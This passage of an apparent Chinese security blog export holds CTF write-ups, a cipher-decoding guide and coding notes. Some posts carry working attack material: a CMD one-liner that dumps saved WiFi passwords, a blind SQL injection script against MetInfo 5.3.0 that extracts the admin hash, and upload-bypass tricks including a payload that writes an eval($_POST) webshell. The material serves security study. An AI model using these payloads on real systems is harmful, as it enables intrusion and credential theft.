    <content type="text"><![CDATA[两个python练习的小脚本，涉及正则表达式，网页爬虫及信息提取。 习题1：从文本中匹配英文单词代码： #!usr/bin/python #coding=utf-8 &apos;&apos;&apos; @author：w2n1ck &apos;&apos;&apos; import re #载入正则表达式模块 f1 = open(&apos;from.txt&apos;) data = f1.read() f1.close() #打开文件，读入文本 result = re.findall(&apos;[A-z]+&apos;, data) #用正则表达式中的findall方法 #找出data中所有从A-Za-z的连续字符 result.sort() #把得到的结果字符串list排序，默认为字典序 data = &apos;\n&apos;.join(result) #把排序后的结果用换行符连接成一段文本 f2 = open(&apos;to.txt&apos;, &apos;w&apos;) f2.write(data) f2.close() #输出到文件中 from.txt内容如下： 结果如下： 习题2： 查询热映电影查询当前正在热映的电影。方法是，找一个电影网站（豆瓣电影、时光网、格瓦拉等等），把它的首页取过来，分析一下网页内容的结构，然后从中取出你要的信息。 因为一个网页上会包含很多内容，如何查找定位到你所需的内容，还是要费点功夫的。你可能会用到正则表达式、urllib，或者BeautifulSoup之类的。 首先安装第三方的网页分析模块：BeautifulSoup 代码： #!usr/bin/python #coding:utf-8 &apos;&apos;&apos; @author：w2n1ck &apos;&apos;&apos; import urllib2 from bs4 import BeautifulSoup print &quot;豆瓣正在热映：&quot; url = &quot;http://movie.douban.com&quot; html = urllib2.urlopen(url).read() soup = BeautifulSoup(html) div_hot = soup.find(&apos;div&apos;,{&quot;id&quot;:&quot;screening&quot;}) for i in div_hot.find_all(&apos;li&apos;, class_=&apos;title&apos;): movie_title = i.a.get_text() # movie_title = movie_title.strip() #去除movie_title两边的空格 print movie_title print &quot;\n豆瓣近期热门：&quot; div_new = soup.find(&apos;div&apos;,{&quot;id&quot;:&quot;hot-gallery&quot;}) for i in div_new.find_all(&apos;li&apos;, class_=&apos;title&apos;): movie_new = i.a.get_text() print movie_new 代码解析： 7、8行分别导入了urllib2、beautifulsoup模块 11行用urllib模块把豆瓣的网页抓下来 12行用BeautifulSoup模块整理抓下来的html内容 13行是重点，把我们需要的那一部分div截取下来（id=”screening”的那部分），需要分析html源码。 接下来在上文的div中，寻找所有 class=”title” 的 li 元素，注意，由于 class_是python中的保留关键字，所以需要 class_=&#39;title&#39;。 有些网页抓取出来的内容前后有很多空格，可以用.strip() 去除。]]></content>
      <tags>
        <tag>编程</tag>
        <tag>爬虫</tag>
        <tag>Python</tag>
        <tag>正则表达式</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CMD命令获取电脑所有连接过的WiFi密码]]></title>
    <url>%2F2016%2F07%2F16%2FCMD%E5%91%BD%E4%BB%A4%E8%8E%B7%E5%8F%96%E7%94%B5%E8%84%91%E6%89%80%E6%9C%89%E8%BF%9E%E6%8E%A5%E8%BF%87%E7%9A%84WiFi%E5%AF%86%E7%A0%81%2F</url>
    <content type="text"><![CDATA[CMD平常人看起來根本没什么用，但是如果你会使用，你会发现：它真的很强大！ Windows 7、Windows 8、Windows 8.1、Windows 10已测试成功！（windows 7下以管理员方式运行） 使用方法：一、以管理员权限运行CMD （以及 开启无线网卡、最好是笔记本） 二、输入命令： for /f “skip=9 tokens=1,2 delims=:” %i in (‘netsh wlan show profiles’) do @echo %j | findstr -i -v echo | netsh wlan show profiles %j key=clear 三、然后CMD就列出很多行 你以前连接过的wifi信息、加密方式、包括密码]]></content>
      <tags>
        <tag>运维</tag>
        <tag>爆破</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[实验吧综合渗透_metinfo_盲注脚本]]></title>
    <url>%2F2016%2F07%2F14%2F%E5%AE%9E%E9%AA%8C%E5%90%A7%E7%BB%BC%E5%90%88%E6%B8%97%E9%80%8F-metinfo-%E7%9B%B2%E6%B3%A8%E8%84%9A%E6%9C%AC%2F</url>
    <content type="text"><![CDATA[MetInfo5.3.0 版本SQL注入。在本地搭建环境，分析如下: 这个漏洞主要是listmod.php，代码的最后一行$serch_sql 怎么做能让这个没有在上面给初始化，这就是我们要做的。 通过调试： 我们的知 控制它是否初始化的另一个变量为imgproduct 当这个变量非search的任意字符的时候，导致serch_sql 不能进行初始化 构造POC： http://localhost/MetInfo5.3/news/news.php?lang=cn&amp;class2=5&amp;serch_sql=as a join met_admin_table as b where if(ascii(substr(b.admin_id,1,1))=97,1,0) limit 0,1– sd&amp;imgproduct=xxxx 这样一来 比sql注入更为简单了97那个位置，然后在判断第二位，再穷聚,自然就爆表了。 实例实验吧综合渗透metinfo。 本题环境就是这个，根据POC写如下脚本： # -*- coding: utf8 -*- import httplib import requests import urllib import string payloads = &apos;abcdefghijklmnopqrstuvwxyz0123456789&apos; url=&quot;http://localhost:8080/MetInfo_v5.3.0/&quot; password = &apos;&apos; for p in range(1, 33): for num in payloads: num = ord(num) poc = &quot;http://localhost:8080/MetInfo_v5.3.0/news/news.php?lang=cn&amp;class2=5&amp;serch_sql=as a join met_admin_table as b where if(ascii(substr(b.admin_pass,&quot;+str(p)+&quot;,1))=&quot;+str(num)+&quot;,1,0) limit 0,1-- sd&amp;imgproduct=xxxx&quot; #print poc #result = urllib.request.urlopen(poc).txt conn = requests.get(poc) res = conn.content res = str(res) if res.find(r&quot;为什么企业要建多国语言网站&quot;)&gt;0: password = password + chr(num) print password break 测试效果如下： 根据如上脚本跑出账户密码为： acd131fce58f4d6f86e4a503a303fa4e simpleware123 这个要收费，附一个MD5解密的免费网址：http://www.pdtools.net/tools/md5.jsp]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>Python</tag>
        <tag>自动化</tag>
        <tag>SQL注入</tag>
        <tag>writeup</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[MarkDown基础语法]]></title>
    <url>%2F2016%2F07%2F13%2FMarkDown%E5%9F%BA%E7%A1%80%E8%AF%AD%E6%B3%95%2F</url>
    <content type="text"><![CDATA[Markdown入门学习小结Markdown是一种可以使用普通文本编辑器编写的标记语言，通过简单的标记语法，它可以使普通文本内容具有一定的格式。Markdown 的目标是实现「易读易写」。 标题在Markdown当中设置标题，有两种方式： 第一种：通过在文字下方添加“=”和“-”，他们分别表示一级标题和二级标题。 第二种：在文字开头加上 “#”，通过“#”数量表示几级标题。（一共只有1~6级标题，1级标题字体最大） 块注释(引用) 通过在文字开头添加“&gt; ”表示块注释。 粗体（强调） 将需要设置为粗体的文字两端使用2个“*”。 有序列表 使用数字 后面跟上句号。 （还要有空格） 链接（Links）Markdown中有两种方式，实现链接，分别为内联方式和引用方式。 内联方式：This is an example link. This is an [example link](http://example.com/). 图片（Images）图片的处理方式和链接的处理方式，非常的类似。 内联方式： ![test](C:\Users\dell\Pictures\404.jpg) 直接使用标签，这样可以指定图片的大小尺寸代码（HTML中所谓的Code）实现方式有两种：第一种：简单文字出现一个代码框。使用&lt;blockquote&gt;。（不是单引号而是左上角的ESC下面~中的）```第二种：大片文字需要实现代码框。使用Tab和四个空格。特殊字符 用\转义。]]></content>
      <tags>
        <tag>MarkDown</tag>
        <tag>博客</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[【PHP安全】PHP弱类型]]></title>
    <url>%2F2016%2F06%2F13%2F%E3%80%90PHP%E5%AE%89%E5%85%A8%E3%80%91PHP%E5%BC%B1%E7%B1%BB%E5%9E%8B%2F</url>
    <content type="text"><![CDATA[没有人质疑php的简单强大，它提供了很多特性供开发者使用，其中一个就是弱类型机制。弱类型的语言对变量的数据类型没有限制，你可以在任何地时候将变量赋值给任意的其他类型的变量，同时变量也可以转换成任意地其他类型的数据。 PHP弱类型 PHP弱类型简介在PHP中，可以进行一下的操作。 $param = 1; $param = array(); $param = &quot;stringg&quot;; 比如 在$a == $b的比较中 $a = null; $b = false; //为真 $a = ‘’; $b = 0; //同样为真实例解释 实例一2016年风云杯的题 题目就是一个登陆框，需要输入账号密码。 post：username[]=1&amp;password[]=2 原因是：用户在输入账号密码之后php会进行解析，首先会把username和password当成数组，username和password再MD5加密之后就变得和数据库中相同，这样就成功登陆。 实例二也是2016年风云杯的题 首先一个备份文件，拿到源码 代码如下： &lt;?php $_GET[‘myid’] = urldecode($_GET[‘myid’]); $flag = ‘xxxxxxxxxxxxxxxxx’; if (isset($_GET[‘name’]) and isset($_POST[‘password’])) { if ($_GET[&apos;name&apos;] == $_POST[&apos;password&apos;]) print &apos;Your password can not be your name.&apos;; else if (sha1($_GET[&apos;name&apos;]) === sha1($_POST[&apos;password&apos;])&amp;($_GET[&apos;myid&apos;]==&apos;anyun&apos;)) die(&apos;Flag: &apos;.$flag); else print &apos;sorry!&apos;; } ?&gt; 首先对myid进行一个urldecode 然后判断是否设置name和password 再然后判断sha1（name）和sha1（password）是否相等，并且myid=anyun 最后输出flag根据对源码分析，构造如下payload： http://139.129.166.67/5677ui8ifgs/index.php?myid=anyun&amp;name[]=1 post：password[]=2这样就绕过了，具体的原因就不一一解释了。 总结作为一个程序员，弱类型确实给程序员书写代码带来了很大的便利，但是也让程序员忘记了$array =array();的习惯。都说一切输入都是有害的 那么其实可以说一切输入的类型也是可疑的，永远不要相信弱类型的php下任何比较函数，任何数学运算。否则，你绝对是被php出卖的那一个。]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>CTF</tag>
        <tag>PHP</tag>
        <tag>代码审计</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[CTF之加解密总结]]></title>
    <url>%2F2016%2F05%2F25%2FCTF%E4%B9%8B%E5%8A%A0%E8%A7%A3%E5%AF%86%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[CTF比赛中主要分为逆向破解，Web安全，加密解密，PWN等几大类，本文主要总结一些自己做过的ctf的以下加密解密的方法和工具等。 0x01 Base64Base64顾名思义就是用64个可显示字符表示所有的ASC字符，64也就是6Bits，而ASC字符一共有256个，也就是8Bits。Base64编码要求把3个8位字节（38=24）转化为4个6位的字节（46=24），之后在6位的前面补两个0，形成8位一个字节的形式。 如果剩下的字符不足3个字节，则用0填充，输出字符使用’=’，因此编码后输出的文本末尾可能会出现1或2个’=’内存1个字符占8位 例如转前： s 1 3 先转成ascii：对应 115 49 51 2进制： 01110011 00110001 00110011 6个一组（4组） 011100110011000100110011 然后才有后面的 011100 110011 000100 110011 然后计算机是8位8位的存数 6不够，自动就补两个高位0了 所有有了 高位补0 科学计算器输入 00011100 00110011 00000100 00110011 得到 28 51 4 51 查对下照表 c z E z 形式 ZXZhbCgkX1BPU1RbcDRuOV96MV96aDNuOV9qMXVfU2gxX0oxM10pNTU2NJC3ODHHYWJIZ3P4ZWY= Base64在线编码解码地址0x02 Base32Base32和Base64相比只有一个区别就是，用32个字符表示256个ASC字符，也就是说5个ASC字符一组可以生成8个Base字符。 Base32在线编码解码地址注：以上两种编码都可以使用python的base64模块来加解密 0x03 培根密码培根密码，培根所用的密码是一种本质上用二进制数设计的，没有用通常的0和1来表示，而是采用a和b密文形式是明显两个不同的字符。如大写字母和小写字母，英文和数字，斜体和正体。 例如DEath IS JUST A PaRT oF lIFE,sOMeTHInG wE&apos;RE aLL dESTInED TO dO. 是大写小写两个不同的字符 大写用a表示，小写用b表示 选取5个一组 DEath aabbb ISJUS aaaaa TAPaR aaaba ToFlI ababa FEsOM aabaa eTHIn baaab GwERE abaaa aLLdE baaba STInE aaaba DTOdO aaab 按照上述的形式去在表里找对应得明文. 第一种方式 A aaaaa B aaaab C aaaba D aaabb E aabaa F aabab G aabba H aabbb I abaaa J abaab K ababa L ababb M abbaa N abbab O abbba P abbbb Q baaaa R baaab S baaba T baabb U babaa V babab W babba X babbb Y bbaaa Z bbaab 第二种方式 a AAAAA g AABBA n ABBAA t BAABA b AAAAB h AABBB o ABBAB u-v BAABB c AAABA i-j ABAAA p ABBBA w BABAA d AAABB k ABAAB q ABBBB x BABAB e AABAA l ABABA r BAAAA y BABBA f AABAB m ABABB s BAAAB z BABBB 培根密码在线解密0x04 摩斯密码摩尔斯电码是一种早期的数字化通信形式，但是它不同于现代只使用零和一两种状态的二进制代码，它的代码包括五种： 点、划、点和划之间的停顿、每个字符间短的停顿（在点和划之间）、每个词之间中等的停顿以及句子之间长的停顿。 形如：– — .-. … . 解密对照下图摩斯密码表: 在线摩斯密码解密0x05 JsFuckJSFuck 可以让你只用 6 个字符 !+ 来编写 JavaScript 程序。 形式： [][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]][([][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]+[])[+[[!+[]+!+[]+!+[]]]]+([][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]]+([][[]]+[])[+[[+!+[]]]]+(![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[+!+[]]]]+([][[]]+[])[+[[+[]]]]+([][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+([][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]]+(!![]+[])+[[+!+[]]]][+[[+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]+(!![]+[])[+[[+[]]]]+([][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]+[])[+[[+!+[]]]+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+[+!+[]]+([][(![]+[])[+[[+[]]]]+([][[]]+[])[+[[!+[]+!+[]+!+[]+!+[]+!+[]]]]+(![]+[])[+[[!+[]+!+[]]]]+(!![]+[])[+[[+[]]]]+(!![]+[])[+[[!+[]+!+[]+!+[]]]]+(!![]+[])[+[[+!+[]]]]]+[])[+[[+!+[]]]+[[!+[]+!+[]+!+[]+!+[]+!+[]+!+[]]]])() 其他一些基本的表达： false =&gt; ![] true =&gt; !![] undefined =&gt; [][[]] NaN =&gt; +[![]] 0 =&gt; +[] 1 =&gt; +!+[] 2 =&gt; !+[]+!+[] 10 =&gt; [+!+[]]+[+[]] Array =&gt; [] Number =&gt; +[] String =&gt; []+[] Boolean =&gt; ![] Function =&gt; [][&quot;filter&quot;] eval =&gt; [][&quot;filter&quot;][&quot;constructor&quot;]( CODE )() window =&gt; [][&quot;filter&quot;][&quot;constructor&quot;](&quot;return this&quot;)() 可以使用firebug直接解密. JsFuck在线解密0x06 栅栏密码所谓栅栏密码，就是把要加密的明文分成N个一组，然后把每组的第1个字连起来，形成一段无规律的话。 不过栅栏密码本身有一个潜规则，就是组成栅栏的字母一般不会太多。（一般不超过30个，也就是一、两句话） 例如明文：THERE IS A CIPHER 去掉空格后变为：THEREISACIPHER 两个一组，得到：TH ER EI SA CI PH ER 先取出第一个字母：TEESCPE 再取出第二个字母：HRIAIHR 连在一起就是：TEESCPEHRIAIHR 还原为所需密码。 而解密的时候，我们先把密文从中间分开，变为两行： T E E S C P E H R I A I H R 再按上下上下的顺序组合起来： THEREISACIPHER 分出空格，就可以得到原文了： THERE IS A CIPHER 例如密文：NlEyQd{seft} N l E y Q d { s e f t } NEQ{etIydsf} python实现栅栏解密：zhalan.py 0x07 凯撒密码它的基本思想是：通过把字母移动一定的位数来实现加密和解密。明文中的所有字母都在字母表上向后（或向前）按照一个固定数目进行偏移后被替换成密文。 ##例如 当偏移量是3的时候，所有的字母A将被替换成D，B变成E，以此类推X将变成A，Y变成B，Z变成C。由此可见，位数就是凯撒密码加密和解密的密钥。 解密参照凯撒密码表： 上述的密文：NEQ{etIydsf} 发现移位11 CTF{tianshu} python实现凯撒解密：kaisa.py 0x08 维吉利亚密码恺撒密码的基础上扩展的多表密码. 实例如果你要对自己的男（女）神用维密（不是维多利亚的秘密）表白，先写好明文：I LOVE YOU 然后自己设定一个密钥，比如：KISS。 这样密钥与明文对应就是 K ISSK ISS I LOVE YOU 对第一个字母“I”加密过程如下： 先找到最左侧密钥K所在的一行和最上方明文I所在列，找到他们的相交字母S，这样I就被加密成了S。 同理，这句话通过每一个对应密钥的加密后就变成如下 密钥：KISSKISS 明文：ILOVEYOU 密文：STGNOGGM 维吉利亚密码表： 维吉利亚加解密工具 0x09 Unicode编码Unicode（统一码、万国码、单一码）是计算机科学领域里的一项业界标准,包括字符集、编码方案等。目前常用的有UTF-8、UTF-16、UTF-32。 密文形式： \u5927\u5bb6\u597d\uff01\u000d\u000a Unicode在线解密 0x10 brainfuck编码Brainfuck是一种极小化的计算机语言，它是由Urban Müller在1993年创建的。由于fuck在英语中是脏话，这种语言有时被称为brainfck或brainf*k，甚至被简称为BF。共有八个字符 字符含义： &gt; 指针加一 &lt; 指针减一 + 指针指向的字节的值加一 - 指针指向的字节的值减一 . 输出指针指向的单元内容（ASCⅡ码） , 输入内容到指针指向的单元（ASCⅡ码） [ 如果指针指向的单元值为零，向后跳转到对应的]指令的次一指令处 ] 如果指针指向的单元值不为零，向前跳转到对应的[指令的次一指令处 密文形式:++++++++++[&gt;+++++++&gt;++++++++++&gt;+++&gt;+&lt;&lt;&lt;&lt;-] &gt;++.&gt;+.+++++++..+++.&gt;++.&lt;&lt;+++++++++++++++. &gt;.+++.------.--------.&gt;+.&gt;. 解密方法 使用brainfuck解释器解密 bftools.exe Decode braincopter doge.jpg -o dogeout.png bftools.exe run dogeout.png Q1RGe0JyYWluZnVja18xc19TaW1wMWV9 CTF{Brainfuck_1s_Simp1e} brainfuck在线解密 0x11 Playfair编码Playfair密码出现于1854年，它依据一个5*5的正方形组成的密码表来编写，密码表里排列有25个字母。如果一种语言字母超过25个，可以去掉使用频率最少的一个。如，法语一般去掉w或k，德语则是把i和j合起来当成一个字母看待。英语中z使用最少，可以去掉它。 加密描述：第一步是编制密码表。在这个5*5的密码表中，共有5行5列字母。 第一列（或第一行）是密钥,其余按照字母顺序。密钥是一个单词或词组，若有重复字母，可将后面重复的字母去掉。当然也要把使用频率最少的字母去掉。 如：密钥是Live and learn,去掉后则为liveandr。如果密钥过长可占用第二列或行 例如首先playfair的加密过程用到一个5x5的字母矩阵,容纳26个字母，其中i和j挤到一个格子里，字母填写顺序取 决于密钥，The quick brown fox jumps over the lazy dog!既然出题者不是在讲故事，那，这句就是密钥了吧 将空格去掉，然后填入矩阵里，重复出现的字母只填一次。 填完后如下表： t h e q u i/j c k b r o w n f x m p s v l a z y d g 填完密钥出现的字母后，若还有空余，就填字母表中剩余的字母（按字母表顺序） 加密过程：把明文按两个字母一组分组，比如hello就分成he,lx,lo 相邻字母相同的情况下，中间加个填充字母x(有时候是q)，若最后一个字母没组员，也加个填充字母。 加密规则： 1、两明文字母m1,m2同行，密文字母c1,c2在它们右边，同行循环，比如hu加密后是et； 2、m1,m2同列：c1,c2在它们下边，同列循环，hz加密后是ch； 3、m1,m2不同行列：c1,c2是m1,m2 组成的长方形的另两个顶点，顺序是c1与m1同行，c2与m2同行，cd加密后是bz； 解密过程：有了密钥矩阵，将加密过程反过来就行。ihxo解密就是ctfx ihxo{smzdodcikmodcismzd} ctfx{playfairisfairplay} 0x12 urlcode编码UrlEncode：将字符串以URL编码 返回值：字符串 函数种类：编码处理 形式：%4d%54%45%35%43%6a%45%77%4d%51%6f%78%4d%44%67%4b%4f%54%6b%4b%4d%54%45%78%43%6a%45%77%4f%51%6f%78%4d%44%45%4b%4d%54%45%32%43%6a%45%78%4d%51%6f%78%4d%54%55%4b%4d%54%41%30%43%6a%45%77%4e%51%6f%78%4d%6a%45%4b%4f%54%63%4b%4d%54%45%77%43%6a%6b%34%43%6a%6b%33%43%6a%45%78%4e%41%3d%3d urlcode在线解密0x13 Serpent编码Serpent（蟒蛇）,它是AES的一个候选算法,该算法使用256位的密钥对128位的决数据进行加解密;描述了Serpent的加解密过程及子密钥生成过程,同时对其性能作了部分阐述 Serpent在线解密0x14 异或加密异或的运算方法是一个二进制运算： 1^1=0 0^0=0 1^0=1 0^1=1 两者相等为0,不等为1. 形式： 一般为一个二进制字符串和一个英文字母 解密过程 先把密钥转化成二进制 再和密文异或 异或解密算法：yihuo.py 0x15 CRC32加密CRC校验实用程序库 在数据存储和数据通讯领域，为了保证数据的正确，就不得不采用检错的手段。在诸多检错手段中，CRC是最著名的一种。CRC的全称是循环冗余校验。CRC是网络传输中经常用的一种校验方式。其中CRC32则是采用这样的一个多项式生成式的CRC：Xe32+Xe26+Xe23+Xe22+Xe16+Xe12+Xe11+Xe10 +Xe8+Xe7+Xe5+Xe4+Xe2+X+1( string$str )生成str的 32 位循环冗余校验码多项式。这通常用于检查传输的数据是否完整。 python计算CRC32 0x16 邮件编码邮件编码即uuencode编码，是将二进制文件转换为文本文件的过程，转换后的文件可以通过纯文本e-mail进行传输，在接收方对该文件进行uudecode，即将其转换为初始的二进制文件 形式：MR,O)^KNYU&gt;;*Q[*[P_?#Q+&quot;AHZS6Q\G,LKNYNZ.LR;;2LK*[N^&amp;CK+/VN/;, MXK:\TJJ]RKZAQ-36K:&amp;CH:,*M/.XQ;3PL+B^S&lt;K&apos;U&gt;+1^;#)=V-T9GMU=75U *=65N8V]D95]??0`` Uuencode在线解密 0x17 曼切斯特编码曼彻斯特编码（Manchester Encoding），也叫做相位编码（ Phase Encode，简写PE），是一个同步时钟编码技术，被物理层使用来编码一个同步位流的时钟和数据。 从低到高跳变表示&quot;0&quot;，从高到低跳变表示&quot;1&quot;。 还有一种是差分曼彻斯特编码，每位中间的跳变仅提供时钟定时，而用每位开始时有无跳变表示&quot;0&quot;或&quot;1&quot;，有跳变为&quot;0&quot;，无跳变为&quot;1&quot;。 即: 0-1 跳变表示 1,1-0 跳变表示 0 然而一般来说无线调制中，传感器和 RF 前端之前通信一般会采用 SPI 接口，而 SPI 接口有两种模式， MSB First 和 LSB First，一般在大多数情况下，都是 MSB First，可是这题不是，有点奇葩，这题是 LSB First 0x18 其他加密希尔密码 Ras加密 Rot13加密 猪圈密码 当铺密码 手机电脑键盘密码 Escape加密 混淆加密Asp混淆加密 Php混淆加密 Css/js混淆加密 VBScript.Encode混淆加密:]]></content>
      <tags>
        <tag>CTF</tag>
        <tag>加密解密</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[上传漏洞总结]]></title>
    <url>%2F2016%2F05%2F11%2F%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E%E6%80%BB%E7%BB%93%2F</url>
    <content type="text"><![CDATA[文件上传漏洞是指用户上传了一个可执行的脚本文件，并通过此脚本文件获得了执行服务器端命令的能力。这种攻击方式是最为直接和有效的，有时候几乎没有什么技术门槛。 0x01 上传检测机制0x01_1 客户端javascript检测通常检测的是文件的扩展名 0x01_2 服务端MIME类型检测通常检测的是Content-Type内容 0x01_3 服务端目录路径检测通常跟path参数相关的内容 0x01_4 服务端文件扩展名检测通常检测跟文件extension相关的内容 0x01_5 服务端文件内容检测检测文件内容是否合法或含有恶意代码 0x02 文件上传漏洞利用0x02_1 javascript客户端验证创建一个允许的文件类型，里面写入我们需要的代码，抓包，拦截，修改为可执行的恶意代码。 0x02_2 MIME类型验证直接修改Content-Type：允许的MIME类型 修改文件名为可执行文件，有时候需要配合修改multipart/form-data的大小写 常见的MIME类型： 超文本标记语言文本 .html text/html xml文档 .xml text/xml 普通文本 .txt text/plain RTF文本 .rtf application/rtf PDF文档 .pdf application/pdf Microsoft Word文件 .word application/msword PNG图像 .png image/png GIF图形 .gif image/gif JPEG图形 .jpeg,.jpg image/jpeg au声音文件 .au audio/basic MIDI音乐文件 mid,.midi audio/midi,audio/x-midi RealAudio音乐文件 .ra, .ram audio/x-pn-realaudio MPEG文件 .mpg,.mpeg video/mpeg AVI文件 .avi video/x-msvideo GZIP文件 .gz application/x-gzip TAR文件 .tar application/x-tar 任意的二进制数据 application/octet-stream 0x02_3 目录路利用解析是从前往后解析，判断是从后往前判断。 零零截断一般步骤为： 1.新建一个名为test.php%00.jpg或者test.php.jpg 2.在里面写入一句话木马（[如何在图片中插入一句话](http://wenku.baidu.com/link?url=GoR21a2WWH2C8c8Q7HIgrz7CoW3B4suAwDaaRkAt6vgCZyYr7Le7Z9ZeiurBIE7NHuNwJ7dro5lCql8mRlk3y2IS7iFbWuQM99HV_kXDvTm)） 3.burp抓包改%00或者.为url编码 iis按照路径解析的是： 比如我们上传一个名为123.asp/123.jpg文件 则，123.asp/123.jpg会被直接解析成123.asp 0x02_4 文件扩展名利用黑名单检测 文件大小写绕过 比如像Asp，Php之类的文件名绕过黑名单检测 名单列表绕过 利用黑名单里没有的名单进行攻击，比如黑名单里没有asa，cer，php3，php5之类的 特殊文件名绕过 修改文件名为test.asp.或者test.asp_（下划线为空格），绕过验证之后，windows会自动去掉点和空格，linux和unix下不支持 0x00截断绕过 双扩展名绕过 apache解析式从后往前，所以如果上传一个test.php.123,不认识.123的文件，所以会往前解析，直到遇到能解析的 .htaccess文件攻击 配合名单列表绕过，上传一个自定义的.htaccess文件，就可以轻松绕过各种检测 新建一个.htaccess文件 代码为： SetHandler application/x-httpd-php 然后上传一个包含test字符串的文件，没有扩展名 里面写入一句话即可 白名单检测 %00截断 解析调用/漏洞绕过 配合上传一个代码注入过的白名单文件即可，再利用解析调用/漏洞 .htaccess文件 0x02_5 文件内容检测绕过 文件头检测 jpg-JFIF-FF D8 FF EO 00 10 4A 46 49 46 gif-GIF89a-47 49 46 38 39 61 png-PNG-89 50 4E 47 在文件头后面加上恶意代码就行了 文件相关信息检测 文件加载检测 在文件注释处插入恶意代码 0x02_6 解析漏洞利用Apache的扩展名顺序解析漏洞命名为test.php.xxx（集成环境里php3都会按照php来解析） IIS的asp解析漏洞 IIS6.0 1.命名为test.asp;.jpg 2.命名为test.asp/123.jpg(test.asp是一个目录) 3.命名为test.asa,test.cer.test.cdx IIS7.5/7.0 在默认Fast-CGI开启状况下,上传一个名字为test.jpg，内容为 &lt;?PHP fputs(fopen(&apos;shell.php&apos;,&apos;w&apos;),&apos;&lt;?php eval($_POST[cmd])?&gt;&apos;);?&gt; 的文件，然后访问test.jpg/.php,在这个目录下就会生成一句话木马 shell.php Nginx的%00解析漏洞 命名为test.jpg%00.php php-cgi的默认配置漏洞]]></content>
      <tags>
        <tag>渗透测试</tag>
        <tag>WAF绕过</tag>
        <tag>文件上传</tag>
      </tags>
  </entry>
  <entry>
    <title><![CDATA[WeChall writeup]]></title>
    <url>%2F2016%2F03%2F04%2FWeChall_writeup%2F</url>
    <content type="text"><![CDATA[WeChall Challage writeup. Training：Get Sourced 查看源码 最后面： &lt;!-- You are looking for this password: html_sourcecode --&gt; Training: Stegano I隐写 下载下来，使用notepad打开 Look what the hex-edit revealed: passwd:steganoI Training: ASCII84, 104, 101, 32, 115, 111, 108, 117, 116, 105, 111, 110, 32, 105, 115, 58, 32, 108, 101, 110, 112, 108, 99, 102, 104, 104, 105, 115, 102 ASCII解码 The solution is: lenplcfhhisf Training: Crypto - Caesar IVJG SWKEM DTQYP HQZ LWORU QXGT VJG NCBA FQI QH ECGUCT CPF AQWT WPKSWG UQNWVKQP KU DHFUHKPPTRCF 凯撒解密，偏移24 THE QUICK BROWN FOX JUMPS OVER THE LAZY DOG OF CAESAR AND YOUR UNIQUE SOLUTION IS BFDSFINNRPAD Encodings: URL%59%69%70%70%65%68%21%20%59%6F%75%72%20%55%52%4C%20%69%73%20%63%68%61%6C%6C%65%6E%67%65%2F%74%72%61%69%6E%69%6E%67%2F%65%6E%63%6F%64%69%6E%67%73%2F%75%72%6C%2F%73%61%77%5F%6C%6F%74%69%6F%6E%2E%70%68%70%3F%70%3D%6D%61%69%68%68%6D%6F%62%68%69%6E%70%26%63%69%64%3D%35%32%23%70%61%73%73%77%6F%72%64%3D%66%69%62%72%65%5F%6F%70%74%69%63%73%20%56%65%72%79%20%77%65%6C%6C%20%64%6F%6E%65%21 URL编码，URL解码 Yippeh! Your URL is challenge/training/encodings/url/saw_lotion.php?p=maihhmobhinp&amp;cid=52#password=fibre_optics Very well done! Training: WWW-Robots考察robots.txt（网络爬虫协议） http://www.wechall.net/robots.txt User-agent: * Disallow: /challenge/training/www/robots/T0PS3CR3T Prime Factory找到第一个和第二个大于1百万，并且每个位上的数字的和都是素数的素数。 代码如下： def iszhishu(n): for i in range(2,n): if n % i ==0: return False return True def sum(n): count = 0 for t in range(len(n)): count += int(n[t]) if iszhishu(count): return True else: return False for num in range(1000001,9999999): if iszhishu(num): if sum(str(num)): print(int(num)) 取前两个 1000033 1000037 PHP 